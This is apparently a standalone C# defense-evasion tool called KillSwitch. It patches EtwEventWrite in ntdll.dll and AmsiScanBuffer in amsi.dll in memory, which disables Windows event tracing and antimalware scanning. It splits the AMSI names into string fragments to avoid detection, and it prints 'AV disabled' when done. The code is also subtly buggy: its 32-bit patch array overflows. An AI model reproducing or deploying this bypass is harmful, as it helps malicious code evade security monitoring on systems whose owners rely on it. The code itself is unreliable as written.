using System;
using System.Runtime.InteropServices;

namespace KillSwitch
{
    class Program
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        static byte[] Magic(string function)
        {
            byte[] patch;
            if (function.ToLower() == "antitrace")
            {
                if (Is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }
                return patch;
            }
            else if (function.ToLower() == "avnomo")
            {
                if (Is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xb8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xc3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xb8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xc3;
                    patch[6] = 0x18;
                    patch[7] = 0x00;
                    patch[8] = 0x57;
                }
                return patch;
            }
            throw new ArgumentException("Function {0} not supported", function);
        }

        static IntPtr LoadAddr(string traceloc, string function)
        {
            IntPtr addr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(addr, function);

            return traceAddr;
        }

        static void AntiTrace()
        {
            byte[] magic = Magic("AntiTrace");
            string traceloc = "ntdll.dll";
            string function = "EtwEventWrite";
            
            // Attemp to load function from dll
            IntPtr traceAddr = LoadAddr(traceloc, function);
            if (traceAddr == IntPtr.Zero) {
                Console.WriteLine("Unable to load {0} {1}.", traceloc, function);
                return;
            }

            // Patch function with magic bytes
            VirtualProtect(traceAddr, (UIntPtr)magic.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magic, 0, traceAddr, magic.Length);
            
            VirtualProtect(traceAddr, (UIntPtr)magic.Length, oldProtect, out uint newoldProtect);
            Console.WriteLine("Tracing disabled");
        }

        static void AVNoMo()
        {
            byte[] magic = Magic("AVNoMo");
            string traceloc = "a" + "m" + "si" + ".dl" + "l";
            string function = "Am" + "siSc" + "anB" + "uf" + "fer";
            
            // Attemp to load function from dll
            IntPtr traceAddr = LoadAddr(traceloc, function);
            if (traceAddr == IntPtr.Zero)
            {
                Console.WriteLine("Unable to load {0} {1}.", traceloc, function);
                return;
            }
            
            // Patch function with magic bytes
            VirtualProtect(traceAddr, (UIntPtr)magic.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magic, 0, traceAddr, magic.Length);

            VirtualProtect(traceAddr, (UIntPtr)magic.Length, oldProtect, out uint newoldProtect);
            Console.WriteLine("AV disabled");
        }


        static void Main(string[] args)
        {
            Console.WriteLine("Kill Switch Engage");
            AntiTrace();
            AVNoMo();
        }
    }
}
